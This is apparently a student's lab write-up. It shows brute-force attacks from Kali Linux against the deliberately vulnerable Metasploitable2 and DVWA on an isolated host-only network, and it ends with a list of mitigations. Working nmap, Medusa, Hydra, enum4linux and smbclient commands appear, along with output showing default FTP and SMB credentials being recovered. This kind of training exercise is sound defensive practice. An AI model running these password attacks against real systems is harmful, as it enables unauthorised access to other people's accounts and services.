# 🧠 Cybersecurity Challenge - [Brute Force Attack with Kali Linux and Medusa and other tools]...

> Full documentation of steps, evidence and scripts used in this cybersecurity challenge.

---

## 📋 Table of Contents...
- [🧩 Challenge Description](#-challenge-description)
- [🎯 Objectives](#-objectives)
- [🧪 Environment](#-environment)
- [⚙️ Steps Performed](#-steps-performed)
- [🖼️ Evidence (Screenshots)](#-evidence-screenshots)
- [🧰 Scripts & Tools](#-scripts--tools)
- [🏁 Conclusion](#-conclusion)
- [👨‍💻 Author](#-author)
---

## 🧩 Challenge Description...
Implement, document, and share a practical project using Kali Linux and some tools such as Medusa, Hydra, NMap and Enum4Linux, along vulnerable environments (for example, Metasploitable 2 and DVWA), to simulate brute-force attack scenarios and practice mitigation measures.

---

## 🎯 Objectives...
- [ ] Discover active hosts...  
- [ ] Enumerate ports and services...  
- [ ] Identify and exploit weak authentication via Medusa...  
- [ ] Demonstrate privilege escalation paths...  
- [ ] Document prevention and mitigation measures...

---

## 🧪 Environment...
We use VirtualBox with two VMs, Kali Linux and Metasploitable2, on a Host-Only network for isolation and repeatability.

**Minimum requirements...**  
- Kali Linux VM
- Metasploitable2 VM
- VirtualBox installed

**Quick setup steps...**  
1. Create two VMs in VirtualBox, one Kali and one Metasploitable2...  
2. In each VM → Settings → Network, set **Adapter 1: Host-Only Adapter**...  
3. Optionally, we can assign static IPs or rely on Host-Only DHCP, e.g., `192.168.56.10` (Kali), `192.168.56.101` (Metasploitable2)...  
4. From Kali, verify connectivity:  
   ```bash
   ping -c 3 192.168.56.101

## ⚙️ Steps Performed
1. Find a Target Host IP Address, using nmap, with this command we can scan from 192.168.56.100 to 105 IP interval to find alive hosts and write the result into a file scan.txt.
   > nmap -v -sn 192.168.56.100-105 > scan.txt

2. After that, we can have a full report from the desired host with all services running, each with their respective version.
   > nmap -sV 192.168.56.101 | sed -n '/^Nmap scan report for 192\.168\.56\.101/,/^MAC Address:/p' > report.txt

3. Creating USER and PASS lists:
   On this lab, we will be creating simple lists to use on our simulation.

USERS list:
> echo -e "user\nmsfadmin\admin\nroot" > users.txt

PASSWORD list:
> echo -e "123456\npassword\nquery\nmsfadmin" > pass.txt

4. Using MEDUSA to check FTP service vulnerability:

In this case we can use our lists to brute force access on FTP service with MEDUSA.
> medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
> 
> 2025-10-13 10:18:13 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
> ...more on SCREENSHOTS

5. Using HYDRA to brute force Web Form.

Now we have another scenary, a DVWA WEB FORM and we will try to pass.

First we'll access http://192.168.56.101/dvwa/login.php

Now using other wordlists we can use HYDRA to check it out.
>hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form \
 "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 6 -V

6. Password SPRAYING and Enum4Linux

Enum4Linux is a good tool to enumerate services from a Host.

> enum4linux -a 192.168.56.101 > enum4out.txt


7. Using MEDUSA to find the Key for a smbnt service.
   
> medusa -h 192.168.56.101 -U users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
2025-10-13 10:52:57 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

Now we can check if it's the right one.

>smbclient -L 192.168.56.101 -U msfadmin


## 🖼️ Evidence (Screenshots)

*** More on Screenshots folder ***


## 🧰 Scripts & Tools
Virtual Box | https://www.virtualbox.org/
Metaspoitable2 | https://www.rapid7.com/products/metasploit/metasploitable/
Kali Linux | https://www.kali.org/
Medusa | https://www.kali.org/tools/medusa/
Enum4Linux | https://www.kali.org/tools/enum4linux/
Hydra | https://www.kali.org/tools/hydra/
nMap | https://nmap.org/ | https://www.kali.org/tools/nmap/


## 🏁 Conclusion

The lab revealed clear security gaps... Default and weak passwords were found... Services exposed to common networks made access easier... Lack of audits and monitoring increased risk...


Practical mitigations:

1. Enforce strong password policies and credential management via tools (SSM, vault).

2. Stop exposing unnecessary services to public networks, use segmentation and VPNs.

3. Restrict services to VLANs and strict firewall rules.

4. Run regular configuration audits and pentests, fix critical findings immediately.

5. Continuous monitoring and anomaly detection (SIEM/EDR), with alerts and response playbooks.

6. Maintain asset inventory and review/remove privileged or stale accounts.

7. Require MFA for all admin and sensitive service access.

## 👨‍💻 Author

Renato de Castro
Developer / Security Enthusiast.

